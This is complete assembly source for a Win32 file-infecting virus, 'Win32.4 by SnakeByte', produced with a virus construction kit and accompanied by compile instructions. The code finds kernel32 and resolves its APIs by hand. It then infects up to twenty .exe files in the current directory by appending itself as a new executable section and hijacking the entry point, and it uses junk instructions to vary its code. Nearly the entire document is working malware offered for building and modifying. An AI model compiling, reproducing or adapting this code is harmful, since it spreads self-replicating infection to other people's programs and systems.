              
;
;
; Win32.4 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.4
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/14/2016
;  Infection Mark         : 4
;  Infection Type         : adding a new section 
;  API Search             : Byte Comparison Type I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : searching on fixed locations
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 21
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 8d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 77903 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop edx
                                        ; mov ebp, edx
 mov ebp, edx
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]

 push esi
 push edi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
                                        ; mov ebx, 276
 push 276d
 pop ebx
 lea ecx, [ebp+WFD_szFileName]
 xchg edi, ecx


ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 add edi, 1d
 dec ebx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]

 push ebx
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

 mov ecx, edx                           ; Trash
InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea ecx, [ebp+filemask]
 xchg edi, ecx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 adc ebx, 22153965d                     ; Trash
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
                                        ; mov edi, -1
 mov edi, -1d
 and edi, dword ptr [ebp+FindHandle]
 push edi
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ecx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, ecx
 add esi, [ecx+3Ch]
                                        ; get File Alignment
                                        ; add esi, 60
 add esi, 60d
 mov ebx, [esi]
 sub esi, 60d
 mov dword ptr [ebp+filealign], 0
 add dword ptr [ebp+filealign], ebx
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edx, dword ptr [esi+3Ch]
 add edx, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edx
                                        ; get old Entrypoint
 mov eax, dword ptr [edx+28h]
 mov dword ptr [ebp+OldEIP], eax
 mov eax, dword ptr [edx+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], eax
 mov ebx, [edx+38h]
 mov dword ptr [ebp+sectionalign], ebx
                                        ; Get last section
 mov ecx, [edx+74h]
 shl ecx, 3
                                        ; clear ebx
 mov ebx, 63666d
 sub ebx, 63666d
 mov bx, word ptr [edx+6h]
 mov eax, 28h
 pushad
 mov eax, ebx
 mul eax
 mov dword ptr [ebp+Misc1], 0
 mov dword ptr [ebp+Trash1], ebx        ; Trash
 add dword ptr [ebp+Misc1], eax
 popad
 push dword ptr [ebp+Misc1]
 pop ebx
 add edx, 78h
 add edx, ecx
 add edx, ebx
 lea eax, [ebp+newsection]


 xchg eax, edx
 push eax
                                        ; Calculate the RVA of the new section
 mov ecx, [eax-5*8+8d]
 add ecx, [eax-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], ecx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov ebx,[eax-5*8+20d]
 add ebx,[eax-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 xor dword ptr [ebp+AlignReg1], ebx
 mov dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsphysicaloffset], -1
 and dword ptr [ebp+nsphysicaloffset], edx
                                        ; calculate new size
 mov ebx, dword ptr [ebp+filealign]
 mov ecx, edx
 add ecx, VirusSize
 mov dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], ecx
 call Align
 mov ecx, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], ecx
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], ecx
 call CreateMap
 jc NoEXE
 pop edx
 lea edi, [ebp+newsection]
 xchg edi, esi

                                        ; mov eax, 64
 mov eax, 64d
WriteNewSectionLoop:
 mov ch, byte ptr [esi]
 mov byte ptr [edx], ch
                                        ; add esi, 1
 inc esi
 sub eax, 1
                                        ; add edx, 1
 inc edx
 test eax, eax
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 mov ebx, dword ptr [ebp+PEheader]
 sub word ptr [ebx+06h], -1
 mov eax, dword ptr [ebp+nsRVA]
 or edx, 67870896d                      ; Trash
 mov dword ptr [ebp+NewEIP], eax
                                        ; set new EIP
 mov dword ptr  [ebx+28h], eax
                                        ; set infection mark
 mov dword ptr [ebx+4Ch], 0h
 add dword ptr [ebx+4Ch], '4'
 mov edx, dword ptr [ebp+nsphysicaloffset]
 push edx
                                        ; Append Virus
 pop edi
 add edi, dword ptr [ebp+MapAddress]
 mov eax, VirusSize
 lea edx, [ebp+Virus]
 xchg esi, edx


AppendLoop:
 movsb
 adc dword ptr [ebp+Trash1], 797395     ; Trash
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 mov ebx, dword ptr [ebp+InfCounter]
 sub ebx, 1
 mov dword ptr [ebp+InfCounter], ebx
 clc
ret

NoEXE:
 pop ebx
 stc
ret



;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 sar eax, 15d                           ; Trash
 pop edi

 mov dword ptr [ebp+retEIP], edi

                                        ; clear edx
 push 0
 pop edx
 add edx, dword ptr [ebp+OldBase]

 push edx
 pop dword ptr [ebp+retBase]


                                        ; get Kernel by using hardcoded values
 mov esi, 077f00000h
 call GetKernel32
 jnc GetApis
 mov esi, 0bff70000h
 call GetKernel32
 jnc GetApis
 mov esi, 077e00000h
 call GetKernel32
 jnc GetApis

 jmp NoKernel
GetKernel32:
 pushad
                                        ; clear edi
 and edi, 0

 lea eax, dword ptr [esp-8h]
 xchg eax, dword ptr fs:[edi]
 lea edx, [ebp+GetKernel32Exception]
 xchg ebx, edx

 push ebx
 push eax
 xor ecx, edx                           ; Trash

                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 0
 add dword ptr [ebp+K32Trys], 4h

GK1:                                    ; check for DOS-EXE Stub
 cmp dword ptr [ebp+K32Trys], 0h
 jnz GotKernelXX
 jmp GetKernel32NotFound
GotKernelXX:
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je CheckPE

GK2:
 dec esi
 sub esi, 65535d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [esi+3Ch]
 xchg edx, esi
 add esi, edx
 xchg edx, esi
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 inc edx
 add edx, 21d
                                        ; clear eax
 sub eax, eax
 movzx eax, word ptr [edx]
 and ax, 0F000h
 cmp ax, 02000h
 je GotDLL
 jmp GK2
GotDLL:                                 ; we found a DLL file
 add ecx, eax                           ; Trash
 dec edx
 sub edx, 21d


KernelFound:
 mov dword ptr [ebp+KernelMZ], esi
 mov dword ptr [ebp+KernelPE], 0
 add dword ptr [ebp+KernelPE], edx
 mov eax, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear ebx
 mov ebx, 0
 add ebx, [eax+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 dec ebx
 add ebx, 29d
                                        ; get ATableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], eax
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
                                        ; get NTableVA
 mov eax, dword ptr [ebx]
                                        ; add ebx, 4
 add ebx, 4d
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], eax
                                        ; get OTableVA
 mov eax, dword ptr [ebx]
 add eax, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], eax
                                        ; clear ebx
 and ebx, 0

 pop dword ptr fs:[ebx]
 pop ecx
 popad
 clc
ret

GetKernel32Exception:
                                        ; clear eax
 mov eax, 20949d
 sub eax, 20949d

 mov edx, dword ptr fs:[eax]
 mov esp, dword ptr [edx]
GetKernel32NotFound:
                                        ; clear edi
 mov edi, 0

 pop dword ptr fs:[edi]
 pop ecx
 popad
 stc
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear edx
 xor edx, edx
 add edx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg esi, eax

 lea edi, [ebp+APINames]
 xchg edi, ebx


GetApisLoop: 

 mov ecx, ebx
APINameDetect:                          ; calculate the lenght of the names
 add ecx, 1d
 cmp byte ptr [ecx], 0
 jne APINameDetect

 push ecx
 sub dword ptr [esp], ebx
 pop ecx
                                        ; search 'em
                                        ; ecx contains Name-Lenght
                                        ; ebx points to the Name
                                        ; esi points to the offset

 call SearchAPI1
 add ebx, ecx
                                        ; add ebx, 1
 sub ebx, -1d
 mov eax, dword ptr [ebp+TempAPI]
 mov dword ptr [esi], 0
 add dword ptr [esi], eax
                                        ; add esi, 4
 add esi, 4d
 dec edx
 jnz GetApisLoop
 jmp Outbreak



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; ecx Lenght of API-Name
                                        ; ebx Points to API-Name ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h




 mov edx, dword ptr [ebp+NTableVA]
 mov dword ptr [ebp+Trash1], eax        ; Trash


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], edx
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [edx]
                                        ; mov edx, eax
 mov edx, eax
                                        ; mov edi, eax
 push eax
 pop edi
 mov dword ptr [ebp+TempApisearch1], ecx
 mov dword ptr [ebp+TempApisearch2], edi
 push ebx
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; ebx Points to API-Name ( Virus )
                                        ; compare Names

ApiCompareLoop:
 mov al, byte ptr [ebx]
 cmp al, byte ptr [edi]
 jne ApiNotFound
 dec ecx
 sub ecx, 1
 inc ecx
 jz FoundApi1
                                        ; add ebx, 1
 inc ebx
                                        ; add edi, 1
 add edi, 1d
 jmp ApiCompareLoop

ApiNotFound:                            ; we did not find it :(
 pop ebx
 mov edi, dword ptr [ebp+TempApisearch2]
                                        ; clear ecx
 and ecx, 0
 xor ecx, dword ptr [ebp+TempApisearch1]
                                        ; clear edx
 mov edx, -50424d
 add edx, 50424d
 add edx, dword ptr [ebp+NTableTemp]
                                        ; add edx, 4
 add edx, 4d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2000h
 je NotFoundApi1
 sub dword ptr [ebp+Trash1], ebx        ; Trash
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
 pop edx
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop edi
                                        ; clear eax
 mov eax, 16903d
 sub eax, 16903d
 mov ax, word ptr [edi]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov edx, dword ptr [eax]
 add edx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], edx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop esi
 popad
 jmp ExecuteHost



;                  [ ///// * Data * \\\\\ ]

Data:
 TempAPI     dd 0h

 APIOffsets:
 XFindFirstFileA        dd 0h
 XCreateFileMappingA    dd 0h
 XMapViewOfFile         dd 0h
 XFindNextFileA         dd 0h
 XCreateFileA           dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XUnmapViewOfFile       dd 0h

 filealign   dd 0h
 NTableTemp  dd 0h

 APINames:
 db 'FindFirstFileA', 0
 db 'CreateFileMappingA', 0
 db 'MapViewOfFile', 0
 db 'FindNextFileA', 0
 db 'CreateFileA', 0
 db 'CloseHandle', 0
 db 'FindClose', 0
 db 'UnmapViewOfFile', 0


 FileHandle  dd 0h
 K32Trys     dd 0h
 FindHandle  dd 0h
 AlignReg1   dd 0h
 NewSize     dd 0h
 OldEIP      dd 0h
 filemask    db '*.exe',0
 counter     dw 0h
 KernelMZ    dd 0h
 ATableVA    dd 0h
 db 'Win32.4 by SnakeByte',0
 OTableVA    dd 0h
 sectionalign   dd 0h
 InfCounter  dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 Misc1       dd 0h
 MapAddress  dd 0h
 OldBase     dd 400000h
 AlignReg2   dd 0h
 PEheader    dd 0h
 MapHandle   dd 0h
 TempApisearch1 dd 0h
 NTableVA    dd 0h
 TempApisearch2 dd 0h
 NewEIP      dd 0h
 KernelPE    dd 0h
newsection:                           ; Settings for the new section
 nsname           db '.section'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 Trash1      dd 0h




;        [ ///// * File Handling Procedure * \\\\\ ]

 sub eax, edx                           ; Trash
                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear ebx
 push 0
 pop ebx

 push ebx
 push ebx
 push 3h
 push ebx
                                        ; add ebx, 1
 sub ebx, -1d
 push ebx
 push 80000000h or 40000000h
 lea ecx, [ebp+WFD_szFileName]

 push ecx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 dec eax

 mov dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 mov edx, dword ptr [ebp+WFD_nFileSizeLow]
 push edx
 xor dword ptr [ebp+Trash1], ebx        ; Trash
 push 0
 push edx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop edx
                                        ; add eax, 1
 inc eax
 sub eax, 1
 jz CloseFile
                                        ; clear eax
 mov eax, 0
 push edx
 push eax
 push eax
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 rcl ebx, 23d                           ; Trash
 mov dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 xor edx, edx
 push eax
 div ebx
 sub ebx, edx
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 or ecx, 95248814d                      ; Trash
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 lea edx, [ebp+WFD_nFileSizeLow]
 xchg edx, eax

 cmp dword ptr [eax], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear edi
 mov edi, 53970d
 sub edi, 53970d
 xor edi, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
                                        ; mov edx, 4339
 mov edx, 4339d
 or edx, edx
 jnz Notagoodfile
Goodfile:
 cmp word ptr [edi+3Ch], 0h
 je Notagoodfile
 mov edx, dword ptr [edi+3Ch]
 inc dword ptr [ebp+Trash1]             ; Trash
                                        ; check if header lies inside the file
 cmp edx, dword ptr [ebp+WFD_nFileSizeLow]
 ja Notagoodfile
 add edx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je Goodfile2
                                        ; clear eax
 push 0
 pop eax
 or eax, eax
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edx+4Ch], '4'
 jz Notagoodfile
                                        ; check for DLL
 mov cx, word ptr [edx+16h]
 and cx, 0F000h
 cmp cx, 02000h
 je Notagoodfile
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], ebx

 mov esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], esi


 inc eax                                ; Trash

ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
                                        ; add ebp, 1
 add ebp, 1d
 sub ebp, 1
 jz FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 push ecx
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

